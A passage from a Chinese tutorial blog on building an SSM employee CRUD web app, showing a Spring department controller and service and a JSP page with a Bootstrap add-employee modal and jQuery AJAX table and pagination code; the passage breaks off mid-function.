<p>接下来就给下拉列表添加数据库查询并显示就好了<br>编写一个DepartmentController用于处理请求<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">package com.ceit.crud.controller;</span><br><span class="line"></span><br><span class="line">import com.ceit.crud.bean.Department;</span><br><span class="line">import com.ceit.crud.bean.Msg;</span><br><span class="line">import com.ceit.crud.service.DepartmentService;</span><br><span class="line">import org.springframework.beans.factory.<span class="keyword">annotation</span>.<span class="title">Autowired</span>;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">RequestMapping</span>;</span><br><span class="line">import org.springframework.web.bind.<span class="keyword">annotation</span>.<span class="title">ResponseBody</span>;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 处理和部门有关的请求</span><br><span class="line"> *<span class="regexp">/</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">@Controller</span></span><br><span class="line"><span class="regexp">public class DepartmentController &#123;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    @Autowired</span></span><br><span class="line"><span class="regexp">    private DepartmentService departmentService;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    /</span>**</span><br><span class="line">     * 返回所有的部门信息</span><br><span class="line">     *<span class="regexp">/</span></span><br><span class="line"><span class="regexp">    @RequestMapping("/depts</span><span class="string">")</span></span><br><span class="line"><span class="string">    @ResponseBody</span></span><br><span class="line"><span class="string">    public Msg getDepts()&#123;</span></span><br><span class="line"><span class="string">        //查出的所有部门信息</span></span><br><span class="line"><span class="string">        List&lt;Department&gt; list = departmentService.getDepts();</span></span><br><span class="line"><span class="string">        return Msg.success().add("</span>depts<span class="string">",list);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><br>还需要对应的Service<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Department;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.DepartmentMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.<span class="keyword">annotation</span>.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DepartmentService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DepartmentMapper departmentMapper;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Department&gt; getDepts()&#123;</span><br><span class="line">        List&lt;Department&gt; list = departmentMapper.selectByExample(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>接下来就是编写模态框的事件了<br><figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    web路径：</span></span><br><span class="line"><span class="ruby">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="ruby">        以/开始的相对路径，找资源，以服务器的路径为标准（<span class="symbol">http:</span>/<span class="regexp">/localhost:3306）需要加上项目名</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 员工添加的模态框 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>员工添加<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> 男</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> 女</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            部门提交部门id即可-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                部门名称-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>关闭<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>保存<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-标题-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-按钮-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示表格数据-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    员工数据等-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-显示分页信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页文字信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示页码等信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            显示分页条信息-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    //1.页面加载完成以后，直接去发送一个ajax请求，要到分页数据</span></span><br><span class="line"><span class="xml">    $(function ()&#123;</span></span><br><span class="line"><span class="xml">        //去首页</span></span><br><span class="line"><span class="xml">        to_page(1);</span></span><br><span class="line"><span class="xml">    &#125;);</span></span><br><span class="line"><span class="xml">    </span></span><br><span class="line"><span class="xml">    function to_page(pn) &#123;</span></span><br><span class="line"><span class="xml">        $.ajax(&#123;</span></span><br><span class="line"><span class="xml">            url:"$&#123;APP_PATH&#125;/emps",</span></span><br><span class="line"><span class="xml">            data:"pn="+pn,</span></span><br><span class="line"><span class="xml">            type:"GET",</span></span><br><span class="line"><span class="xml">            success:function (result)&#123;</span></span><br><span class="line"><span class="xml">                // console.log(result);</span></span><br><span class="line"><span class="xml">                //1.解析并显示员工数据</span></span><br><span class="line"><span class="xml">                build_emps_tables(result);</span></span><br><span class="line"><span class="xml">                //2.解析并显示分页信息</span></span><br><span class="line"><span class="xml">                build_page_info(result);</span></span><br><span class="line"><span class="xml">                //3.解析并显示分页条数据</span></span><br><span class="line"><span class="xml">                build_page_nav(result);</span></span><br><span class="line"><span class="xml">            &#125;</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    function build_emps_tables(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空table</span></span><br><span class="line"><span class="xml">        $("#emps_table tbody").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        var emps=result.extend.pageInfo.list;</span></span><br><span class="line"><span class="xml">        $.each(emps,function (index,item) &#123;</span></span><br><span class="line"><span class="xml">            var empIdTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empId);</span></span><br><span class="line"><span class="xml">            var empNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.empName);</span></span><br><span class="line"><span class="xml">            var genderTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.gender=='M'?"男":"女");</span></span><br><span class="line"><span class="xml">            var emailTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.email);</span></span><br><span class="line"><span class="xml">            var deptNameTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(item.department.deptName);</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             编辑</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var editBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-primary btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-pencil")).append("编辑");</span></span><br><span class="line"><span class="xml">            /**</span></span><br><span class="line"><span class="xml">             * <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">             删除</span></span><br><span class="line"><span class="xml">             <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">             */</span></span><br><span class="line"><span class="xml">            var delBtn = $("<span class="tag">&lt;<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span>").addClass("btn btn-danger btn-sm")</span></span><br><span class="line"><span class="xml">                .append($("<span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>").addClass("glyphicon glyphicon-trash")).append("删除");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            var btnTd = $("<span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span>").append(editBtn).append(" ").append(delBtn);</span></span><br><span class="line"></span><br><span class="line"><span class="xml">            //append方法执行完成之后还是返回原来的元素</span></span><br><span class="line"><span class="xml">            $("<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span>").append(empIdTd)</span></span><br><span class="line"><span class="xml">                .append(empNameTd)</span></span><br><span class="line"><span class="xml">                .append(genderTd)</span></span><br><span class="line"><span class="xml">                .append(emailTd)</span></span><br><span class="line"><span class="xml">                .append(deptNameTd)</span></span><br><span class="line"><span class="xml">                .append(btnTd)</span></span><br><span class="line"><span class="xml">                .appendTo("#emps_table tbody")</span></span><br><span class="line"><span class="xml">        &#125;);</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页信息</span></span><br><span class="line"><span class="xml">    function build_page_info(result)&#123;</span></span><br><span class="line"><span class="xml">        //清空分页信息</span></span><br><span class="line"><span class="xml">        $("#page_info_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        $("#page_info_area").append("当前"+result.extend.pageInfo.pageNum+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.pages+"页,总"</span></span><br><span class="line"><span class="xml">            +result.extend.pageInfo.total+"条记录");</span></span><br><span class="line"><span class="xml">    &#125;</span></span><br><span class="line"><span class="xml">    //解析显示分页条,点击分页要能去下一页等等....</span></span><br><span class="line"><span class="xml">    function build_page_nav(result) &#123;</span></span><br><span class="line"><span class="xml">        //清空</span></span><br><span class="line"><span class="xml">        $("#page_nav_area").empty();</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //page_nav_area</span></span><br><span class="line"><span class="xml">        var ul = $("<span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span>").addClass("pagination");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        //构建元素</span></span><br><span class="line"><span class="xml">        var firstPageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("首页").attr("href","#"));</span></span><br><span class="line"><span class="xml">        var prePageLi = $("<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>").append($("<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>").append("&amp;laquo;"));</span></span><br><span class="line"><span class="xml">        if(result.extend.pageInfo.hasPreviousPage == false)&#123;</span></span><br><span class="line"><span class="xml">            firstPageLi.addClass("disabled");</span></span><br><span class="line"><span class="xml">            